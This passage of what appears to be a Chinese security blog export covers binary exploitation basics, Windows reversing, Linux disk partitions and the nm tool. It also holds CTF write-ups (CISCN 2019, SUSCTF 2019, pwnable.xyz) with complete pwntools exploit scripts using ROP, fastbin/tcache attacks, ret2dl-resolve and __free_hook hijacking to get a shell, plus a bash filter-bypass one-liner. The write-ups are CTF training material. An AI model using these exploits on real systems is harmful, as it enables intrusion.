从C语言可以知道,指针的值是一个地址,大部分时候字符串数组都是局部变量,而局部变量存储在栈中,并且内存大小确定.那么如果输入的内容超过字符数组的长度,则数组本身的内存就容不下这么多"字符"了,就会溢出到其他内存.而发生在栈中的溢出就叫做栈溢出,由于栈的设计和函数调用的设计,使得栈溢出可以造成很大的危害. 常见的危险函数:gets,scanf,strcpy,sprintf,memcpy,strcat等. 与其类似的还有数组越界,read函数的size参数过大等等.这一类漏洞的特点就是用户可以通过输入修改一些程序设计者不想其修改的数据,甚至还有程序逻辑的缺陷(栈溢出中易实现). 非法读 这种漏洞也叫做泄露,这种漏洞主要作用是泄露信息以方便绕过程序保护机制,有的时候也可以直接通过泄露获取目的信息. 12345//某函数内char a[16];read(0, a, 160);puts(a); 上述代码生成的程序如果输入中不带\0,那么就会输出栈中数据(遇\0截断),比如栈地址,残留libc地址,canary等. 栈地址可以用来通过相对地址差求出缓冲区等栈上的地址,从而设计并利用漏洞.残留libc地址可以用来通过二进制文件函数和全局变量偏移固定求出加载机制(常用在libc). 这些运用的原理都是基于虽然随机化了段加载的基址,但同一个段中偏移固定. 函数实现缺陷 典型例子. abs(0x80000000) == 0x80000000;. scanf("%d", &amp;x);,如果输入+\n会导致scanf正常执行但是不改变x. 整数溢出 当程序中的数据超过其数据类型的范围就会造成溢出,整数类型的溢出被称为整数溢出.这种情况可能会导致越界写等漏洞. 条件竞争 条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序,这些不受控制的事件没有按照开发者想要的方式运行时,就会出现bug. 条件竞争需要如下的条件. 并发,即至少存在两个并发执行流.这里的执行流包括线程,进程,任务等级别的执行流. 共享对象,即多个并发流会访问同一对象.常见的共享对象有共享内存,文件系统,信号.称访问共享对象的代码为临界区,在正常写代码时这部分应该加锁. 改变对象,即至少有一个控制流会改变竞争对象的状态.因为如果程序只是对对象进行读操作,那么并不会产生条件竞争. 典型的有文件读写的问题. 程序的运行 以ELF文件的运行为例.当执行./test时发生了什么. shell读取命令发现这是一个执行命令.调用fork()并在子进程中执行execve("./test", *argv[], *envp[]). execve系统调用会使进程陷入内核态,调用sys_execve -&gt; do_execve -&gt; ...(sys_execve检测execve的后两个参数,do_execve判断文件类型并调用对应的处理器),最后调用load_elf_binary解析文件头,如果程序为动态链接则通过.interp确定加载器路径,然后通过程序头表加载ELF文件,最后修改sys_execve返回地址返回用户态(动态链接返回ld.so的entry point,静态链接返回ELF的entry point)). 动态链接情况下,ld.so会进行映射共享库,初始化GOT等操作,最后返回ELF的entry point. ELF的entry point一般为_start,负责将环境变量指针,.init指针和.fini指针传给libc_start_main函数. libc_start_main函数依次调用.init,main,.fini,最后执行exit结束程序的运行. 栈 栈是一片内存区域,本质上是一个内核数据结构,保存了一个函数调用时所需要的维护信息,包括局部变量,返回地址,函数参数等.从栈底开始(也就是最开始)保存的依次为运行的环境变量,命令行参数,函数栈帧. 也可以说栈是程序时用来保存局部变量,返回地址和其他需要保存的值的一片内存区域(也是一个FILO的数据结构). 其栈顶的值保存在寄存器esp(32位环境),栈底的值由操作系统决定.且栈顶小于栈底,也就是说栈是向下增长的. 延时绑定 首先编译程序可以选择动态链接和静态链接. 静态链接把所有使用的函数库函数(一般一个函数一个文件)链接到目标文件,这样会让可执行文件大小变大,同时运行时物理内存中会多次映射同一个函数,但运行速度快. 延时绑定基于动态链接,动态链接并不把目标文件和函数库文件链接在一起,而是等到程序在装载或运行过程中链接函数库.(这样用同一函数库的进程可以共用这个函数库,节约内存和磁盘) 动态链接会在调用库函数的地方打桩(stub),然后通过plt和dl_runtime_resolve函数实现,链接后地址存储在.got表. 延时绑定有以下特点. 最开始.got表表项不是真正的函数地址.在第一次调用触发延时绑定后才被改为真正的地址. 调用库函数时会将.got表表项当做函数地址. 每个plt表项都是一段对对应库函数的调用代码. 线程局部存储 TLS是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突,尤其是多个线程同时需要修改这一变量时. 通过TLS机制为每一个使用该全局变量的线程都提供一个变量值的副本,每一个线程均可以独立地改变自己的副本,而不会和其它线程的副本冲突.这个机制在不同的架构和操作系统上的实现不同. x86-64的linux中由glibc实现该机制,在glibc实现中,每个线程有一个对应的结构体tcbhead_t,被指向段寄存器fs(x86-64). 1234567891011typedef struct &#123; void *tcb; dtv_t *dtv; void *self; int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; //...&#125; tcbhead_t; 线程在pthread_create的帮助下创建,然后给这个新线程选择TLS,为栈分配内存后glibc在内存的高地址初始化TLS,在x86-64架构上,栈向下增长,将TLS放在栈顶部. 从TLS中减去一个特定的常量值得到被新线程的stack register所使用的值.从TLS到pthread_create的函数参数传递栈帧的距离小于一页. 加载其他版本ld和libc 123456789101112131415161718192021222324from pwn import *def change_ld(binary, ld): binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) return ELF(path)elf = change_ld('./chall', './ld-2.29.so')r = elf.process(env = &#123;'LD_PRELOAD' : './libc-2.29.so'&#125;) 运行与调试不同架构程序 对于不同架构的程序可以通过qemu和对应动态库运行. 12qemu-arm -L /usr/arm-linux-gnueabi -g 1234 ./pwnqemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./pwn 调试. 123gdb-multiarchfile pwntarget remote :1234 根据需要安装共享库.以mips为例. 1apt-cache search "libc6" | grep mips 程序保护 由于二进制漏洞日益增多,相应的产生了很多保护机制. 使用checksec检测程序保护措施. 1checksec [fileName] ASLR Address Space Layout Randomization(地址空间随机化). 随机生成进程地址空间(例如栈,库和基于brk的堆)的关键部分的起始地址. 由/proc/sys/kernel/randomize_va_space决定,有以下三种情况. 0 - 表示关闭进程地址空间随机化. 1 - 表示将mmap的基址,stack和vDSO页面随机化. 2 - 表示在1的基础上增加heap的随机化. Off2lib Linux Kernel &lt; 3.18. PIE enabled情況下image之间的offset固定. 可由code image推出所有mapping. kernel版本不同offset也有差异. Fixed kernel &gt;= 3.18. 无法由code段推出libc位置. 但可以用libc推出mmap及其他Library的位置. stack Canary 在栈中保存的ebp和局部变量之间维护一个变量,函数执行完的时候检测这个值是否改变来检测栈是否被破坏.(这个值每个进程唯一). Linux程序的Canary保护是通过gcc编译选项来控制的. - -fstack-protector:启用堆栈保护.不过只为局部变量中含有char数组的函数插入保护代码. - -fstack-protector-strong:启用堆栈保护.比前者广. - -fstack-protector-all:启用堆栈保护,为所有函数插入保护代码. - -fno-stack-protector:禁用堆栈保护,为默认选项. 这个值会先存放在TLS区段的tcbhead_t结构中,x86架构中寄存器gs指向该结构,x86-64中寄存器fs指向该结构. NX 属于DEP技术,堆栈不可执行,防止shellcode的执行.早期通过jmp esp这一特殊的机器代码,使控制流到栈上,然后在栈上写shellcode. 通过映射页的时候设置页的rwx属性中的x实现,可以通过mprotect函数改变页属性从而执行shellcode,或者使用ROP绕过. gcc编译器默认开启了NX选项,如果需要关闭NX选项,可以添加-z execstack参数. PIE 地址无关可执行文件,可执行文件每次运行加载的基址随机化,需要操作系统支持. fPIE不能用于编译库(so),PIE默认不开启,-no-pie显式关闭. 12345gcc -o test test.c // 默认情况下,不开启PIEgcc -fpie -pie -o test test.c // 开启PIE,此时强度为1gcc -fPIE -pie -o test test.c // 开启PIE,此时为最高强度2gcc -fpic -o test test.c // 开启PIC,此时强度为1,不会开启PIEgcc -fPIC -o test test.c // 开启PIC,此时为最高强度2,不会开启PIE RELRO Relocation Read-Only,重定位表只读. 具体选项:Disabled,.got/.got.plt都可写;Partial,got表可写;Full,got表不可写. 1234gcc -o test test.c // 默认情况下,是Partial RELROgcc -z norelro -o test test.c // 关闭,即No RELROgcc -z lazy -o test test.c // 部分开启,即Partial RELROgcc -z now -o test test.c // 全部开启,即Full RELRO FORTIFY 用于检查是否存在缓冲区溢出的错误,限制%n等格式化操作符,针对的是字符串,内存操作函数,例如memcpy,memset,strcpy,strcats,snprintf等等. 123$ gcc -o test test.c // 默认不会开启检查$ gcc -D_FORTIFY_SOURCE=1 -o test test.c // 仅在编译时检查$ gcc -D_FORTIFY_SOURCE=2 -o test test.c // 在程序运行时也会检查,如果判断到缓冲区溢出则会直接终止程序]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Windows-基础]]></title>
    <url>%2Fposts%2Ff92e4c21%2F</url>
    <content type="text"><![CDATA[概述 逆向分析有静态分析与动态分析. 静态分析是指根据反汇编得到的程序清单进行分析,最常用的是从交互处入手,常用的静态分析工具有IDA等. 动态分析是指利用OllyDbg或WinDbg等调试工具跟踪分析,这样就能分析软件在执行过程中的中间结果(而且部分软件会对程序大部分代码加密). 而高效的动态分析应该注意以下两点: 粗跟踪,指在调试时避过不需要的地方(CALL,REP,LOOP等),而是跟踪程序的主逻辑. 细跟踪,在需要关心和分析的地方进行具体的跟踪分析. Windows操作系统 Windows应用程序的基本架构:Everything is window,按钮,文本框,标签,选项卡等.一个图形界面的程序由多个窗口组成,每个元素被分配了一个句柄. Win32 API简述 每个操作系统都会对工作在其上的应用程序员提供API,即提供应用程序运行所需要的窗口管理,图形设备接口,内存管理等服务的函数. Win API就是以函数库的形式组织在一起的Windows应用程序编程接口.Win API子系统负责将API调用转换为Windows系统的系统服务调用.用于16位Windows系统的称为Win16,用于32位Windows系统的称为Win32,而64位系统的功能和名称都基本没有变化,只是用64位代码实现. Windows运转的核心是动态链接,Windows提供的函数调用(API)采用动态链接库实现.比如提供操作系统核心功能服务.包括进程,线程控制,内存管理,文件访问等功能的KERNEL32.DLL. 在NT架构下Win32 API接受ASCII和Unicode两种字符集.(开发过程中开发工具会通过设置自动选择) 消息机制 Windows是一个消息驱动式系统,Windows消息提供应用程序和应用程序之间,应用程序与操作系统之间的通信手段(SendMessage函数). 应用程序的功能由消息触发,通过对消息的响应和处理完成. Windows系统有两种消息队列: 系统消息队列. 应用程序消息队列. 虚拟内存 虚拟内存实现方法与过程: 当一个应用程序启动,操作系统创建一个进程,并给该进程分配2GB的虚拟地址. 虚拟内存管理器将应用程序的代码映射到其虚拟地址对应的位置,并将当前需要的代码读入物理地址. 如果使用DLL,DLL也会被映射到进程的虚拟地址空间中,需要时才会被读入物理内存. 其他项目(数据,堆栈等)的空间是从物理内存分配,并被映射到虚拟地址空间中. 应用程序通过使用其虚拟地址空间的地址开始执行,然后虚拟地址管理器把每次内存访问映射到物理地址上. 调试符号 调试符号是被调试程序的二进制信息与源程序信息之间的桥梁,是源文件编译期间生成的用于支持调试的副产品,包括变量,类型,函数名,源代码行等.一般由符号表(调试符)记录这部分信息. 现在最常用的符号格式为PDB,是由微软设计的未公开格式,其符号根据应用程序不同的链接方式保存在一个或多个文件中. DBG为系统调试符,链接器并不创建DBG文件,微软将操作系统调试符分配在DBG文件中(如ntdll.dbg,kernel32.dbg). MAP文件是程序全局符号,源文件和代码行号信息的唯一文本表示方法,具有极高的通用性. MS-DOS和16位Windows(现在的Windows 9x)使用SYM格式的调试符.COFF格式由Windows NT 2.1首次使用.CodeView格式最早是MS-DOS下作为Microsoft C/C++ 7的一部分出现,现已支持Win32. 动态分析 主要通过OllyDbg等动态调试器. 硬件断点原理 硬件断点和DRx调试寄存器有关.DRx调试寄存器共有8个(0~7).其中DR0~DR3为调试地址寄存器,保存需要监视的地址.DR4~DR5保留.DR6为调试寄存器组状态寄存器,DR7为调试寄存器组控制寄存器. 反调试 程序检测自身是否正在被调试,如果检测到正在被调试的话,就会结束自身进程或者不按常规流程运行,这就是反调试技术. 常见的可以使用API函数IsDebuggerPresent检测,该函数是被Kernel32.dll导出的,没有参数,如果当前程序正在被调试的话,返回值为1,没有被调试的话,返回值为0. 逆向分析基础 PE格式 PE是Portable Executable File Format简写,它是目前Windows平台上的主流可执行文件格式.Microsoft Visual C++提供的WINNT.H里有PE数据结构的完整定义.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ciscn-2019-quals-pwn]]></title>
    <url>%2Fposts%2F2234866d%2F</url>
    <content type="text"><![CDATA[your_pwn 可重复利用的单字节读写的漏洞.先直接读取栈上的返回地址泄露pie基址. 然后构造ROP链打印库函数地址泄露libc.直接调用system(binsh);获得flag. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level = 'debug'pop_rdi_ret = 0xd03pop_rsi_r15_ret = 0xd01#r = process("./pwn")r = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")r.recvuntil("name:")r.sendline("w4rd3n")def get(p): i = 0 ll = 0 while(1): r.recvuntil("index\n") r.sendline(str(i + p)) data = r.recvuntil("value\n")[:-17] data = int(data[-2:],16) if(i &lt; 8): ll += data * (0x100 ** i) r.sendline(str(data)) i += 1 if(i % 41 == 0): r.recvuntil("continue(yes/no)? \n") r.sendline("yes") return lldef write(p, x): i = 0 while(1): r.recvuntil("index\n") r.sendline(str(i + p)) r.recvuntil("value\n") data = 0 if(i != 40): data = (x[i/8] / (0x100 ** (i % 8))) % 0x100 r.sendline(str(data)) i += 1 if(i % 41 == 0): r.recvuntil("continue(yes/no)? \n") r.sendline("yes") returnpie = get(0x158) - 0xb11print "pie: " + hex(pie)write(0x158, [pie + pop_rdi_ret, pie + 0x202020, pie + 0x8B0, pie + 0xb0c, 0, 0, 0, 0])libc = u64(r.recvuntil("\n")[0:6].ljust(8,'\0')) - 0x06f690print "libc: " + hex(libc)system = libc + 0x045390binsh = libc + 0x18cd57write(0x158, [pie + pop_rdi_ret, binsh, system, 0, 0, 0, 0, 0])r.interactive() daily remove的时候没有对index进行范围检测. 先利用unsorted bin泄露libc,再利用fastbin单链表泄露heap基址. 申请一个chunk,在里面伪造一个堆指针和对应的faker chunk.free掉这个faker chunk,通过edit构造其fd到bss上,由于length可控,通过remove构造出一个chunk头部绕过检查. 成功fastbin attack,获得任意读写的能力,由于程序开了Full RELRO所以劫持__free_hook调用system(binsh);获得flag. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context.log_level = 'debug'#r = process("./pwn")ptr = 0x602060r = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com", "58512")def show(): r.sendline(str(1)) data = r.recvuntil("Your choice:") return datadef add(length, content): r.sendline(str(2)) r.recvuntil("of daily:") r.sendline(str(length)) r.recvuntil("daily\n") r.send(content) r.recvuntil("Your choice:")def edit(index, content): r.sendline(str(3)) r.recvuntil("of daily:") r.sendline(str(index)) r.recvuntil("daily\n") r.send(content) r.recvuntil("Your choice:")def remove(index): r.sendline(str(4)) r.recvuntil("of daily:") r.sendline(str(index)) r.recvuntil("Your choice:")r.recvuntil("Your choice:")add(0x100, 'a')#0add(0x100, 'b')#1add(0x100, 'c')#2add(0x100, 'd')#3remove(0)remove(2)add(0x100, 'a' * 8)#0add(0x100, 'a' * 8)#2r.sendline(str(1))r.recvuntil("aaaaaaaa")heap = u64(r.recvuntil("1 :")[:-3].ljust(8,'\0')) - 0x220r.recvuntil("aaaaaaaa")libc = u64(r.recvuntil("3 :")[:-3].ljust(8,'\0')) - 0x3c4b78print "heap: " + hex(heap)print "libc: " + hex(libc)remove(0)remove(1)remove(2)remove(3)add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0add(0x20, 'a')#1add(0x50, 'a')#2add(0x20, 'a')#3remove((heap + 0x18 - ptr - 8) / 0x10)edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18))remove(1)add(0x40, 'a')#1add(0x40, 'a')#4edit(4, p64(ptr))edit(2, p64(0x100) + p64(ptr) + p64(0) * 4)edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57))edit(1, p64(libc + 0x045390))#gdb.attach(r)r.sendline(str(4))r.recvuntil("of daily:")r.sendline(str(2))r.interactive() baby_pwn ret2dl in x86,没有可供leak的函数.保护很少,想起之前的0ctf2018 babystack,修改脚本直接打. 123456789101112131415161718192021222324252627import sysimport roputilsfrom pwn import *context.log_level = 'debug'#r = process("./pwn")r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")rop = roputils.ROP('./pwn')addr_bss = rop.section('.bss')buf1 = 'A' * 0x2cbuf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)r.send(buf1)buf2 = rop.string('/bin/sh')buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')buf2 += rop.fill(100, buf2)r.send(buf2)buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)r.send(buf3)#gdb.attach(r)r.interactive() Virtual 首先是store_instruction函数将输入通过分隔符分类为各种操作符并保存在堆中,store_num同理. 其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据). op函数不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里IDA反汇编有问题,没有识别出函数调用,实际上i会被赋值为函数调用的返回值. 这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先push. 先使用load泄露堆上的堆地址,由于没开pie,通过-和/求出.got[puts]和此处偏移,再次load泄露libc,处理与system的偏移获得system地址. 不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得.got[puts]偏移,调用save成功劫持puts@plt. 突然发现username作用,开始试了/bin/sh,ls,cat flag什么的都是comment not found,最后/bin/bash成功. 1234567891011121314151617181920212223242526from pwn import *#context.log_level = 'debug'#r = process("./pwn")r = remote("a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com", "40003")r.recvuntil("Your program name:\n")r.sendline("/bin/bash")r.recvuntil("Your instruction:\n")payload = "push push push load push sub div sub load push add"payload += " push push push load push sub div sub save"#payload = "push push push load push sub div sub load pop"r.sendline(payload)#gdb.attach(r)r.recvuntil("Your stack data:\n")#payload = "-1 8 -5 4210720"payload = "-1 8 -5 4210720 -172800 -1 8 -6 4210720"#0x404020 = 4210720,offset = -172800,one_gadget = -173178r.sendline(payload)#print r.recv()r.interactive() bms 远端环境是libc2.26,可以使用tcache攻击,利用double free把chunk分配在stdout附近,使tcache bin指向_IO_2_1_stdout_. 修改结构体泄露libc,再次使用tcache攻击分配chunk到__free_hook,劫持为one_gadget,调用free获得shell. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'#r = process("./pwn")r = remote("39.106.224.151", "60002")def add(name, length, content): r.send(str(1)) r.recvuntil("book name:") r.send(name) r.recvuntil("description size:") r.send(str(length)) r.recvuntil("description:") r.send(content) r.recvuntil("&gt;\n")def remove(index): r.sendline(str(2)) r.recvuntil("index:") r.sendline(str(index)) r.recvuntil("&gt;\n")r.recvuntil("username:")r.send("admin\n\x00")r.recvuntil("password:")r.send("frame\n\x00")r.recvuntil("&gt;\n")add("a", 0xf0, "a")#0remove(0)remove(0)add("a", 0xf0, p64(0x602020))#1add("a", 0xf0, p64(0x602020))#2add("a", 0xf0, p8(0x20))#3r.send(str(1))r.recvuntil("book name:")r.send("a")r.recvuntil("description size:")r.send(str(0xf0))r.recvuntil("description:")r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4libc = u64(r.recvuntil("&gt;\n")[:6].ljust(8, '\0')) - 0x78460add("a", 0xe0, "a")#5remove(5)remove(5)add("a", 0xe0, p64(libc + 0x3dc8a8))#6add("a", 0xe0, p64(libc + 0x3dc8a8))#7add("a", 0xe0, p64(libc + 0x47c46))#8r.sendline(str(2))r.recvuntil("index:")r.sendline(str(5))#gdb.attach(r)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operations-Linux-磁盘分区]]></title>
    <url>%2Fposts%2Fbde6bff1%2F</url>
    <content type="text"><![CDATA[常见磁盘接口 个人计算机常见磁盘接口有IDE和SATA,后者是现在主流. 一个IDE扁平电缆可以连接两个IDE设备(区分为主设备和从设备),通常主机会提供两个IDE接口IDE1(primary)和IDE2(secondary). 12345+----------------------------------+|IDE\Jumper | Master | Slave ||IDE1 | /dev/hda | /dev/hdb ||IDE2 | /dev/hdc | /dev/hdd |+----------------------------------+ 由于SATA/USB/SCSI等磁盘接口都是使用SCSI模块来驱动,所以这些接口的磁盘设备文件名都是/dev/sd[a-p]的格式. 具体磁盘文件名由Linux内核检测到磁盘的顺序. 主引导分区和分区表 磁盘数据读写在盘片上,盘片又可以分出扇区与柱面两种单位,其中扇区大小为512bytes. 磁盘的第一个扇区十分重要,因为其记录了两个重要的信息: 主引导分区(MBR):可以安装引导加载程序的地方,由446bytes. 分区表(partition table):记录整块硬盘分区的状态,有64bytes. 标记字节:55,AA. 磁盘分区表 分区表分为四组记录区,每组记录区记录了该区段的起始与结束的柱面号码.分区的最小单位就是柱面. 假如当前设备文件名为/dev/hda,那么四个分区的设备文件名为/dev/hda[1-4],数字与分区位置相关. 由于分区表只有64bytes,最多容纳四个分区(分为主或扩展分区). 其中扩展分区的目的是使用额外的扇区记录分区信息.而由扩展分区继续切出来的分区叫做逻辑分区.(逻辑分区数字从5开始) 开机流程 CMOS是记录各项硬件参数且嵌入在主板上的存储器.而BIOS则是一个写入到主板上的一个韧体(即写入到硬件上的软件程序),同时也是开机时计算机系统会主动执行的第一个程序. BIOS会根据用户设置去获取能开机的硬盘,并到该硬盘去读取第一个扇区的MBR位置,然后运行MBR中的引导加载程序. 而引导加载程序目的时加载内核文件,之后由内核文件进行工作. 其中引导加载程序的主要功能有: 提供开机选项菜单. 载入内核文件. 转交其他loader. 引导加载程序除了可以安装在MBR之外,还可以安装在每个分区的引导扇区,而实际可开机的内核文件是放置到各分区,loader只认识自己系统分区内的可开机文件和其他loader. 只有第一个可开机设备内的MBR会被系统主动读取. 磁盘分区选择 Linux所有数据都是以文件形态呈现的,形成一个目录树结构,其中最重要的就是/,也就是根目录. mount就是利用一个目录当成进入点,将磁盘分区的数据放置在该目录下. Linux支持的文件系统类型 ext2/ext3:是Linux适用的文件系统类型. physical volume(LVM):用来弹性调整文件系统大小的一种机制,可以让你的文件系统大小变化而不改变原有的文件数据的内容. software RAID:利用Linux操作系统特性,用软件仿真出磁盘阵列的功能. swap:内存交换空间.不需要挂载点. vfat:同时被Linux和Windows支持的文件系统类型. 常用分区方案 /boot:primary - etx3. /:primary - etx3. /home:primary - etx3. swap:logival - swap.]]></content>
      <categories>
        <category>CS</category>
        <category>operations</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwnable-xyz]]></title>
    <url>%2Fposts%2F852f801%2F</url>
    <content type="text"><![CDATA[Welcome malloc失败并不会退出程序,而是返回null(也就是0). 所以只要输入一个足够大的数字就可以使malloc返回0,结合v5[size - 1] = 0;可以写到目的地. sub 虽然读入用的是%u,但变量是int类型,所以输入对应负数的补码的十进制形式即可. add 数组越界,写偏移13到返回地址即可,第二次input输入字母跳出循环.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-susctf-2019]]></title>
    <url>%2Fposts%2Fe67f3bea%2F</url>
    <content type="text"><![CDATA[checkin 检测子字符串sh.执行s\h绕过检测. pwn_collection 里外都有uaf,里面的note大小可控(小于0x5f). 利用double free进行fastbin attack,找到合适的偏移成功泄露libc,然后又找到个偏移写free@plt. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *context.log_level = 'debug'ptr = 0x602160r = remote("211.65.197.117", "10008")# r = process("./pwn_collection")r.recvuntil("chioce&gt;")r.sendline("1")r.recvuntil("input your name(no more than 20)\n&gt;")r.sendline("cws")r.recvuntil("input password\n&gt;")r.sendline("cws")r.recvuntil("chioce&gt;")r.sendline("2")r.recvuntil("input your index\n")r.sendline("0")r.recvuntil("input your password\n&gt;")r.sendline("cws")def add(size, content):​ r.sendline("1")​ r.recvuntil("input your note length\n")​ r.sendline(str(size))​ r.recvuntil("input your note\n")​ r.send(content)​ r.recvuntil("chioce&gt;")def check(id):​ r.sendline("2")​ r.recvuntil("input your note idx\n")​ r.sendline(str(id))​ data = r.recvuntil("not")​ data = data[:-12]​ r.recvuntil("chioce&gt;")​ return datadef dele(id):​ r.sendline("3")​ r.recvuntil("input your note idx\n")​ r.sendline(str(id))​ r.recvuntil("chioce&gt;")r.recvuntil("chioce&gt;")add(0x30, "a")#0add(0x30, "b")#1add(0x30, "c")#2dele(0)#1dele(1)#0dele(0)#noneheap = u64(check(0)[0:8].ljust(8, '\0')) - 0xb0add(0x30, p64(0x602062))#0add(0x30, p64(0x602062))#1add(0x30, p64(0x602062))#2add(0x30, "/bin/sh;aaaaaa")#3system = u64(check(3)[14:14 + 8].ljust(8, '\0')) - 0x3c5620 + 0x45390# print "system: " + hex(system)add(0x50, "a")#0add(0x50, "b")#1add(0x50, "c")#2dele(4)#1dele(5)#0dele(4)#noneadd(0x50, p64(0x601ffa))#0add(0x50, p64(0x601ffa))#1add(0x50, p64(0x601ffa))#2add(0x50, p64(0)[2:] + p64(0) + p64(system))#3r.sendline("3")r.recvuntil("input your note idx\n")r.sendline(str(3))# gdb.attach(r)r.interactive() ret2moon 由于后门函数和main函数的差别只有一个字节,修改v2从而赋值操作作用于返回地址,然后写一字节即可. tcache_pwn 简单的tcache攻击,double free后修改fd,再次malloc修改目标地址. 先泄露libc然后劫持free@plt即可. testFile 程序主逻辑.即不断把输入字符和其在字符串中的偏移是否与5个int共20个字节一一相等. 真假校徽 Linux下compare一下. 1compare 1.png 2.png diff.png minBash 利用已知bash漏洞:BASH_CMDS[a]=/bin/sh;a. PCAP 打开浏览,发现有价值的一段base64.解码,明显是zip文件,利用文件内的密码解压即得到flag.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-nm]]></title>
    <url>%2Fposts%2F926102fb%2F</url>
    <content type="text"><![CDATA[功能 可以查看动态和静态库中的符号.列出.o,.a,.so中的符号信息,包括符号的值,类型及名称等. 使用 最好先用file查看对象文件所属处理器架构,然后再用相应交叉版本的nm工具. 1nm [option(s)] [file(s)] 有用的options. –help:显示nm的选项. -a或–debug-syms:显示所有的符号,包括debugger-only symbols; -A:在每个符号信息的前面打印所在对象文件名称; -B:等同于–format=bsd,用来兼容MIPS的nm; -C:输出demangle过了的符号名称,为了区分重载函数C++编译器会将函数返回值/参数等信息附加到函数名称中去形成一个mangle过的符号; –no-demangle:默认的选项,不需要将低级符号名解析成用户级名; -D:打印动态符号; -e:列出文件的静态和外部符; -f format:使用format格式输出.format可以选取bsd,sysv或posix,该选项在GNU的nm中有用.默认为bsd; -g或–extern-only:仅显示外部符号; -l或–line-numbers:使用对象文件中的调试信息打印出所在源文件及行号,必须保证你的对象文件中带有符号调式信息,这一般要求你在编译的时候指定一个-g选项; -p或–no-sort:按目标文件中遇到的符号顺序显示,不排序; -P或–portability:使用POSIX.2标准输出格式代替默认的输出格式.等同于使用任选项-f posix; -s或–print-armap:当列出库中成员的符号时,包含索引.索引的内容包含,哪些模块包含哪些名字的映射; –size-sort:按大小排列符号顺序.该大小是按照一个符号的值与它下一个符号的值进行计算的; -n,-v或–numeric-sort:按符号对应地址的顺序排序,而非按符号名的字符顺序; -r或–reverse-sort:反转排序顺序; –target=bfdname:指定一个目标代码的格式,而非使用系统的默认格式; -u或–undefined-only:打印出那些未定义的符号; -V或–version:显示nm的版本号; -x:以十六进制显示符号大小和值; -X64:显示所有64位对象符号,忽略所有32位对象符号; –defined-only:仅显示定义的符号; 符号类型 对于每一个符号来说,其类型如果是小写的,则表明该符号是local的;大写则表明该符号是global(external)的. A:该符号的值在今后的链接中将不再改变,常常出现在中断向量表中,例如用符号来表示各个中断向量函数在中断向量表中的位置; B:该符号放在BSS段中,通常是那些未初始化的全局变量; C:该符号为common,common symbol是未初始化数据段.只有在链接过程中才进行分配.符号的值表示该符号需要的字节数;例如在一个C文件中,定义int test,并且该符号在别的地方会被引用,则该符号类型即为C.否则其类型为B; D:该符号放在普通的数据段中,通常是那些已经初始化的全局变量; G:该符号也位于初始化数据段中.主要用于small object提高访问small data object的一种方式; I:该符号是对另一个符号的间接引用; N:该符号是一个debugging符号; R:该符号位于只读数据区; S:该符号位于非初始化数据区,用于small object; T:该符号放在代码段中,通常是那些全局非静态函数; U:该符号未定义过,需要自其他对象文件中链接进来; V:该符号是一个weak object. W:未明确指定的弱链接符号;同链接的其他对象文件中有它的定义就用上,否则就用一个系统特别指定的默认值;]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-data-structure-队列和栈]]></title>
    <url>%2Fposts%2F2d27a156%2F</url>
